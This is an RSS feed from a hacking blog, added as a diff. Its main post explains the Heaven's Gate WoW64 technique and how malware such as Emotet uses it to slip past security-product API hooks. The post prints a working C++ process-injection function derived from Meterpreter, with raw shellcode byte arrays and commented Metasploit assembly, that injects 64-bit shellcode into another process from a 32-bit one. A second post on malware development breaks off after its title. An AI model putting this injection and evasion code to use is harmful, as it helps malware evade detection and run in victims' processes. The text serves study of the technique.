@@ -1,0 +1,421 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
+  <channel>
+    <title>Evasion on purpurina - a place for hacking</title>
+    <link>http://localhost:1313/tags/evasion/</link>
+    <description>Recent content in Evasion on purpurina - a place for hacking</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>made by jaco with love</copyright>
+    <lastBuildDate>Thu, 19 Sep 2024 20:53:30 +0100</lastBuildDate><atom:link href="http://localhost:1313/tags/evasion/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.jpg</icon>
+    
+    
+    <item>
+      <title>Understanding Heaven´s Gate</title>
+      <link>http://localhost:1313/posts/wow64/</link>
+      <pubDate>Thu, 19 Sep 2024 20:53:30 +0100</pubDate>
+      
+      <guid>http://localhost:1313/posts/wow64/</guid>
+      <description><![CDATA[<h1 id="heavens-gate-lore">Heaven&rsquo;s gate lore</h1>
+<p>The Heaven&rsquo;s Gate tutorial was written by an anonymous hacker going online as Roy G. Biv, a member of a group called 29A.
+After the group disbanded and their e-zine&rsquo;s site went down, the Heaven&rsquo;s Gate technique was later <a href="https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT">reprinted in the 2009 edition of the Valhalla hacker e-zine</a>. I personally would check this resource, as it was the first time the technique was commented.</p>
+<h1 id="why-does-heavens-gate-exist">Why does Heaven&rsquo;s gate exist?</h1>
+<p>In a normal environment, we have 64-bit Windows operative systems (or at least, we expect so). Some detection mechanisms, like antivirus software and OS security features, <strong>do not detect a 32-bit process jumps from running 32-bit compatible code to 64-bit code.</strong> And this is because a 32-bit program cannot inject code into 64-bit programs natively.
+Indeed, 32-bit programs can run on a 64-bit OS because there is a compatibility layer: WoW64.</p>
+<h2 id="the-compatibility-layer-wow64">The compatibility layer: WoW64</h2>
+<p>In a 64-bit Windows kernel, the first piece of code to execute in <strong>any</strong> process is <strong>always</strong> the 64-bit DLL called <strong>ntdll.dll</strong>, also called NTDLL.
+This DLL takes care of <strong>initializing the process in user-mode as a 64-bit process</strong> and setting up the execution of the process.</p>
+<p><strong>But, what happens when a 64-bit Windows kernel runs a 32-bit process?</strong> How does Windows allow that kind of compatibility?
+Well, after NTDLL is loaded, the <strong>Windows on Windows (WoW64)</strong> interface takes over and <strong>loads a 32-bit version of ntdll.dll, called ntdll32.dll</strong>. After loading this DLL, the execution <strong>turns into a 32-bit mode through a far jump to a compatibility code segment</strong> that changes the processor context to work to 32 bits for this process. From now on, for that process, its environment (registers, instructions) is 32-bit. Nevertheless, the kernel is still 64 bit so, <strong>when the process has to perform a syscall (and interact with the kernel space)</strong> the 32-bit NTDLL that was loaded <strong>changes the execution environment to 64-bit mode, executes the 64-bit syscall (calling the 64-bit NTDLL)</strong>, and, once the <em>syscall</em> is performed ntdll32.dll returns the process to 32-bit mode. We can think of ntdll32.dll as a &ldquo;proxy&rdquo; so that the processor runs 32-bit code and 64-bit code when necessary (this is mainly when executing <em>syscalls</em>) in a 64-bit operative system.</p>
+<p>This process is better described in <a href="http://download.microsoft.com/download/3/a/9/3a9ad58f-5634-4cdd-8528-c78754d712e8/28-dw04040_winhec2004.ppt">many</a> <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384274(v=vs.85).aspx">sources</a>, including in the <a href="https://www.safaribooksonline.com/library/view/windows-internals-fifth/9780735625303/ch03s08.html">Windows Internals books</a>, so if you’re interested in reading more, you can do so, but I’ll try to do my best here.</p>
+<h1 id="but-what-is-wrong-with-heavens-gate">But, what is wrong with Heaven&rsquo;s Gate?</h1>
+<p>Besides the fact that this technique is pretty old (I think this is the <a href="https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT">original post</a> which has been since 2008), it has been used in a lot of malware campaigns, like <a href="https://blogs.blackberry.com/en/2023/01/emotet-returns-with-new-methods-of-evasion">Emotet</a>, a banking trojan. For example, the Emotet malware uses Heaven&rsquo;s Gate to perform process hollowing (another malware technique) <strong>from a 32-bit process to a 64-bit process</strong>.</p>
+<p><strong>But why is this used?</strong> Well, this technique is used to <strong>bypass the WoW64 API hooks</strong> performed by the security solutions. While a 32-bit process would normally <strong>pass through the 32-bit API hooks</strong> made by the 32-bit NTDLL.dll (which are the ones monitored by the security solutions), malicious programs can <strong>perform a jump instruction past these hooks in order to execute 64-bit code</strong> from a 32-bit process without having to trigger the API call, which is hooked by the security solutions. Overall, <strong>this is used as an evasion mechanism.</strong></p>
+<p>Windows initially developed this on the assumption that the 64-bit ntdll.dll could not be accessed by a 32-bit process, but Heaven’s Gate takes advantage of this by running x64 instructions which will be completely missed by any application expecting x86 instructions.</p>
+<p>Also, this technique is used to difficult the analysis of the malware samples, as it makes the debugging and emulation harder (and the <em>reversing</em> process of these samples overall).</p>
+<h2 id="analyzing-a-heavens-gate-implementation">Analyzing a Heaven&rsquo;s Gate implementation</h2>
+<p>There are a lot of different implementations of this technique, but they have 90% of the code in common. I will analyze the Heaven&rsquo;s Gate implementation used in the Metasploit Framework, as it is offered as a C++ function.</p>
+<p>The Meterpreter shell <a href="https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c">has a functionality to inject 64-bit code in 64-bit processes from 32-bit meterpreter shells</a>. I use a slightly modified code to <strong>perform the Heaven&rsquo;s Gate, call CreateRemoteThread with a 64-bit shellcode in order to inject 64-bit code from a 32-bit process to a 64-bit code</strong>. My code is the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Definitions used for running native x64 code from a wow64 process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// (src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.h)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (WINAPI <span style="color:#f92672">*</span> X64FUNCTION)( DWORD dwParameter );
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span> (WINAPI <span style="color:#f92672">*</span> EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">InjectWOW64</span>(HANDLE hProc, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> payload, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> payload_len) {
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//	src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	LPVOID pRemoteCode <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	EXECUTEX64 pExecuteX64   <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	X64FUNCTION pX64function <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	WOW64CONTEXT <span style="color:#f92672">*</span> ctx       <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> A simple function to execute native x64 code from a wow64 (x86) process. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> Can be called from C using the following prototype:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> The native x64 function you specify must be in the following form (as well as being x64 code):
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> Original binary:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span><span style="display:flex;"><span>	BYTE sh_executex64[] <span style="color:#f92672">=</span>	<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x83\xC0\x2B\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x02\xE8\x0F\x00\x00\x00\x66\x8C\xD8\x66\x8E\xD0\x83\xC4\x14</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5F\x5E\x5D\xC2\x08\x00\x8B\x3C\xE4\xFF\x2A\x48\x31\xC0\x57\xFF</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xD6\x5F\x50\xC7\x44\x24\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>	BYTE sh_wownativex[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xC4\x50\x48\x89\xFC\xC3</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>							
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> sh_executex64_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(sh_executex64);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> sh_wownativex_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(sh_wownativex);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// inject payload into target process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pRemoteCode <span style="color:#f92672">=</span> VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+</span></span><span style="display:flex;"><span>	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T <span style="color:#f92672">*</span>) NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;remcode = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pRemoteCode); getchar();
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// alloc a RW buffer in this process for the EXECUTEX64 function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pExecuteX64 <span style="color:#f92672">=</span> (EXECUTEX64)VirtualAlloc( NULL, <span style="color:#66d9ef">sizeof</span>(sh_executex64), MEM_RESERVE<span style="color:#f92672">|</span>MEM_COMMIT, PAGE_READWRITE );
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// alloc a RW buffer in this process for the X64FUNCTION function (and its context)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pX64function <span style="color:#f92672">=</span> (X64FUNCTION)VirtualAlloc( NULL, <span style="color:#66d9ef">sizeof</span>(sh_wownativex)<span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span>(WOW64CONTEXT), MEM_RESERVE<span style="color:#f92672">|</span>MEM_COMMIT, PAGE_READWRITE );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// printf(&#34;pExecuteX64 = %p ; pX64function = %p\n&#34;, pExecuteX64, pX64function); getchar();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// copy over the wow64-&gt;x64 stub
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	memcpy( pExecuteX64, sh_executex64, sh_executex64_len );
+</span></span><span style="display:flex;"><span>	VirtualAlloc( pExecuteX64, <span style="color:#66d9ef">sizeof</span>(sh_executex64), MEM_COMMIT, PAGE_EXECUTE_READ );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// copy over the native x64 function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	memcpy( pX64function, sh_wownativex, sh_wownativex_len );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// pX64function shellcode modifies itself during the runtime, so memory has to be RWX
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	VirtualAlloc( pX64function, <span style="color:#66d9ef">sizeof</span>(sh_wownativex)<span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span>(WOW64CONTEXT), MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// set the context
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ctx <span style="color:#f92672">=</span> (WOW64CONTEXT <span style="color:#f92672">*</span>)( (BYTE <span style="color:#f92672">*</span>)pX64function <span style="color:#f92672">+</span> sh_wownativex_len );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>h.hProcess       <span style="color:#f92672">=</span> hProc;
+</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>s.lpStartAddress <span style="color:#f92672">=</span> pRemoteCode;
+</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>p.lpParameter    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>t.hThread        <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// run a new thread in target process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pExecuteX64( pX64function, (DWORD)ctx );
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>( ctx<span style="color:#f92672">-&gt;</span>t.hThread ) {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// if success, resume the thread -&gt; execute payload
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		ResumeThread(ctx<span style="color:#f92672">-&gt;</span>t.hThread);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// cleanup in target process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		VirtualFree(pExecuteX64, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
+</span></span><span style="display:flex;"><span>		VirtualFree(pX64function, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This function receives:</p>
+<ul>
+<li>The handle to the 64 bit process to inject the 64-bit shellcode.</li>
+<li>The 64-bit shellcode.</li>
+<li>The size of the shellcode.</li>
+</ul>
+<p>Then, the steps to execute the 64-bit shellcode in the 64-bit target process are the following:</p>
+<ul>
+<li>Allocate memory space in the target process and copy the 64-bit shellcode for further execution.</li>
+<li>In the 32-bit process, a RW buffer is allocated for the EXECUTEX64 function. <strong>This is the function that performs THE TRANSITION FROM 32-bit to 64-bit space, calls X64FUNCTION (we will see what this is in a moment) and returns from 64-bit to 32-bit space.</strong></li>
+<li>In the 32-bit process, a RW buffer is allocated for for the X64FUNCTION function (and its context). <strong>This function is basically the 64-bit shellcode of CreateRemoteThread, as we want to create a thread in the remote process with our shellcode as the starting point</strong>.</li>
+<li>We change the memory properties of the X64FUNCTION function zone (the CreateRemoteThread) as it modifies itself during runtime.</li>
+<li>We run a new thread in the target process using the EXECUTE64 function, passing the address of the memory we allocated in the first step (therefore, pointing to the shellcode we want to execute).</li>
+<li>Resume the thread (the thread is created in suspended state, as the flag CREATE_SUSPENDED is used in the shellcode that runs the thread).</li>
+<li>Free the memory in the 32-bit process as it is no longer needed.</li>
+</ul>
+<p>Note that we could <strong>have a modified version of this function so that the 64-bit function that is executed is not CreateRemoteThread</strong>, but a Windows API call (for example), or an arbitrary 64-bit function shellcode.</p>
+<h2 id="disassembling-and-analyzing-execute64">Disassembling and analyzing EXECUTE64</h2>
+<p>We want to analyze the <strong>protagonist of this technique: the EXECUTE64 shellcode, which acts as the function that performs the &ldquo;jump&rdquo; to the 32-bit world to the 64-bit world and executes our function.</strong>
+We could use a <a href="https://defuse.ca/online-x86-assembler.htm">known online disassembler</a> and copy the <code>sh_executex64</code> shellcode that is in the code, but we could also take the official ASM that is <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm">declared in the Metasploit Framework</a> that is basically the same code, but in ASM representation. It will be easier for us to comment.</p>
+<p>Let&rsquo;s analyze the code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>; A simple function to execute native x64 code from a <span style="color:#a6e22e">wow64</span> (x86) process. 
+</span></span><span style="display:flex;"><span>; Can be called from C <span style="color:#66d9ef">using</span> the following prototype:
+</span></span><span style="display:flex;"><span>;     <span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span> (WINAPI <span style="color:#f92672">*</span> EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
+</span></span><span style="display:flex;"><span>; The native x64 function you specify must be in the following <span style="color:#a6e22e">form</span> (as well as being x64 code)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>;     <span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (WINAPI <span style="color:#f92672">*</span> X64FUNCTION)( DWORD dwParameter );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
+</span></span><span style="display:flex;"><span>; Un<span style="color:#f92672">-</span>Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un<span style="color:#f92672">-</span>clobbered.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[BITS <span style="color:#ae81ff">32</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WOW64_CODE_SEGMENT	EQU <span style="color:#ae81ff">0x23</span>
+</span></span><span style="display:flex;"><span>X64_CODE_SEGMENT	EQU <span style="color:#ae81ff">0x33</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>start:
+</span></span><span style="display:flex;"><span>	push ebp 								; Stack prologue, save EBP
+</span></span><span style="display:flex;"><span>	mov ebp, esp							; Create a <span style="color:#66d9ef">new</span> stack frame
+</span></span><span style="display:flex;"><span>	push esi								; Save the registers we shouldn<span style="color:#960050;background-color:#1e0010">&#39;</span>t clobber
+</span></span><span style="display:flex;"><span>	push edi								;
+</span></span><span style="display:flex;"><span>	mov esi, [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]						; ESI <span style="color:#f92672">=</span> pFunction
+</span></span><span style="display:flex;"><span>	mov ecx, [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>]						; ECX <span style="color:#f92672">=</span> dwParameter
+</span></span><span style="display:flex;"><span>	call delta								;
+</span></span><span style="display:flex;"><span>delta:
+</span></span><span style="display:flex;"><span>	pop eax									;
+</span></span><span style="display:flex;"><span>	add eax, (native_x64<span style="color:#f92672">-</span>delta)				; get the address of native_x64
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	sub esp, <span style="color:#ae81ff">8</span>								; alloc some space on stack <span style="color:#66d9ef">for</span> far jump
+</span></span><span style="display:flex;"><span>	mov edx, esp							; EDX will be pointer our far jump
+</span></span><span style="display:flex;"><span>	mov dword [edx<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>], X64_CODE_SEGMENT		; set the native x64 code segment
+</span></span><span style="display:flex;"><span>	mov dword [edx], eax					; set the address we want to jump <span style="color:#a6e22e">to</span> (native_x64)
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	call go_all_native						; perform the transition into native x64 and <span style="color:#66d9ef">return</span> here when done.
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	mov ax, ds								; fixes an elusive bug on AMD CPUs, http:<span style="color:#75715e">//blog.rewolf.pl/blog/?p=1484
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	mov ss, ax								; found and fixed by ReWolf, incorporated by RaMMicHaeL
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	add esp, (<span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)						; remove the <span style="color:#ae81ff">8</span> bytes we allocated <span style="color:#f92672">+</span> the <span style="color:#66d9ef">return</span> address which was never popped off <span style="color:#f92672">+</span> the qword pushed from native_x64
+</span></span><span style="display:flex;"><span>	pop edi									; restore the clobbered registers
+</span></span><span style="display:flex;"><span>	pop esi									;
+</span></span><span style="display:flex;"><span>	pop ebp									; restore EBP
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">retn</span> (<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)								; <span style="color:#66d9ef">return</span> to <span style="color:#a6e22e">caller</span> (cleaning up our two function params)
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>go_all_native:
+</span></span><span style="display:flex;"><span>	mov edi, [esp]							; EDI is the wow64 <span style="color:#66d9ef">return</span> address
+</span></span><span style="display:flex;"><span>	jmp dword far [edx]						; perform the far jump, which will <span style="color:#66d9ef">return</span> to the caller of go_all_native
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>native_x64:
+</span></span><span style="display:flex;"><span>[BITS <span style="color:#ae81ff">64</span>]									; we are now executing native x64 code...
+</span></span><span style="display:flex;"><span>	xor rax, rax							; zero RAX
+</span></span><span style="display:flex;"><span>	push rdi								; save <span style="color:#a6e22e">RDI</span> (EDI being our wow64 <span style="color:#66d9ef">return</span> address)
+</span></span><span style="display:flex;"><span>	call rsi								; call our native x64 <span style="color:#a6e22e">function</span> (the param <span style="color:#66d9ef">for</span> our native x64 function is allready in RCX)
+</span></span><span style="display:flex;"><span>	pop rdi									; restore <span style="color:#a6e22e">RDI</span> (EDI being our wow64 <span style="color:#66d9ef">return</span> address)
+</span></span><span style="display:flex;"><span>	push rax								; simply push it to alloc some space
+</span></span><span style="display:flex;"><span>	mov dword [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>], WOW64_CODE_SEGMENT	; set the wow64 code segment 
+</span></span><span style="display:flex;"><span>	mov dword [rsp], edi					; set the address we want to jump <span style="color:#a6e22e">to</span> (the <span style="color:#66d9ef">return</span> address from the go_all_native call)
+</span></span><span style="display:flex;"><span>	jmp dword far [rsp]						; perform the far jump back to the wow64 caller...
+</span></span></code></pre></div>]]></description>
+      
+    </item>
+    
+    
+    
+    <item>
+      <title>My first steps in MalDev</title>
+      <link>http://localhost:1313/posts/firststeps/</link>
+      <pubDate>Wed, 28 Feb 2024 20:53:30 +0100</pubDate>
+      
+      <guid>http://localhost:1313/posts/firststeps/</guid>
+      <description><![CDATA[<h2 id="prelude">Prelude</h2>
